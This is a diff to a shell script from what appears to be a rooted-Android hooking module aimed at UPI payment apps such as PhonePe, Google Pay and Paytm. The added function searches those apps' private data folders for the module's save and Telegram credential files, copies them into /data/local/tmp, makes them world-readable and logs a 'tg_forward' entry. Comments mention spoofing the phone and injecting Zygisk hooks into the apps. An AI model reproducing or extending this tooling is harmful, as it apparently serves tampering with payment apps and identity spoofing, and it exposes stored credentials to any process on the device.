@@ -62,7 +62,68 @@ is_upi_pkg() {
   echo "$UPI_PACKAGES" | grep -qx "$1"
 }
 
+# PhonePe often cannot write /data/local/tmp — copy Save from app files / Download
+hivirtus_harvest_saves() {
+  local found="" f pkg bn
+  for pkg in $UPI_PACKAGES; do
+    pkg=$(echo "$pkg" | tr -d ' \r\n')
+    [ -z "$pkg" ] && continue
+    for f in \
+      "/data/data/$pkg/files/hivirtus_ui_save.json" \
+      "/data/user/0/$pkg/files/hivirtus_ui_save.json" \
+      "/data/user_de/0/$pkg/files/hivirtus_ui_save.json" \
+      "/data/data/$pkg/cache/hivirtus_ui_save.json" \
+      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_ui_save.json"
+    do
+      if [ -f "$f" ] && [ -s "$f" ]; then
+        found="$f"
+        break 2
+      fi
+    done
+  done
+  [ -z "$found" ] && for f in \
+    /sdcard/Documents/hivirtus_ui_save.json \
+    /sdcard/Download/hivirtus_ui_save.json \
+    /storage/emulated/0/Documents/hivirtus_ui_save.json \
+    /storage/emulated/0/Download/hivirtus_ui_save.json
+  do
+    if [ -f "$f" ] && [ -s "$f" ]; then
+      found="$f"
+      break
+    fi
+  done
+  if [ -n "$found" ]; then
+    cp -f "$found" /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
+    echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+  fi
+  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android; do
+    for f in \
+      "/data/data/$pkg/files/hivirtus_telegram_credentials.json" \
+      "/data/user/0/$pkg/files/hivirtus_telegram_credentials.json" \
+      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_telegram_credentials.json" \
+      "/data/data/$pkg/files/hivirtus_tg_test.request" \
+      "/data/user/0/$pkg/files/hivirtus_tg_test.request"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      bn=$(basename "$f")
+      cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
+      chmod 666 "/data/local/tmp/$bn" 2>/dev/null
+    done
+  done
+  for f in /sdcard/Documents/hivirtus_telegram_credentials.json \
+           /sdcard/Download/hivirtus_telegram_credentials.json \
+           /sdcard/Documents/hivirtus_tg_test.request \
+           /sdcard/Download/hivirtus_tg_test.request; do
+    [ -f "$f" ] && [ -s "$f" ] || continue
+    bn=$(basename "$f")
+    cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
+    chmod 666 "/data/local/tmp/$bn" 2>/dev/null
+  done
+}
+
 sync_config() {
+  hivirtus_harvest_saves
   # Runtime JSON overwrite mat karo (telegram wipe) — sirf spoof phone + first-boot seed
   # Promote HTML Save → runtime so Zygisk hooks pick up without app restart
   if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
